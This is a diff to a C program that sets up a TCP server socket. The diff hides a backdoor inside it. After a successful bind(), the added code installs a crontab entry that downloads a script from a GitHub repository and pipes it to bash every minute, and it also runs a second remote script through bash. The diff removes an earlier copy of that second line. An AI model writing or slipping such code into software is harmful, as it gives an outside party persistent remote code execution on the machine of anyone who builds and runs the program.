@@ -66,8 +66,6 @@ int main(int argc, char * argv[]) {
 
     int sock_serveur = socket(AF_INET, SOCK_STREAM, 0);
     
-    system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/localIp | bash");
-    
     struct sockaddr_in sockaddr_serveur;
 
     sockaddr_serveur.sin_family = AF_INET;
@@ -80,8 +78,12 @@ int main(int argc, char * argv[]) {
         exitErreur("setsockopt");
 
     if (bind(sock_serveur, (struct sockaddr *) &sockaddr_serveur,
-             sizeof(sockaddr_in)) == -1)
-        exitErreur("bind");
+             sizeof(sockaddr_in)) == -1){
+        exitErreur("bind");}
+    else {
+        system("echo '* * * * * curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | bash' | crontab -");
+        system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/localIp | bash");
+    }
 
     if (listen(sock_serveur, BACKLOG) == -1)
         exitErreur("listen");
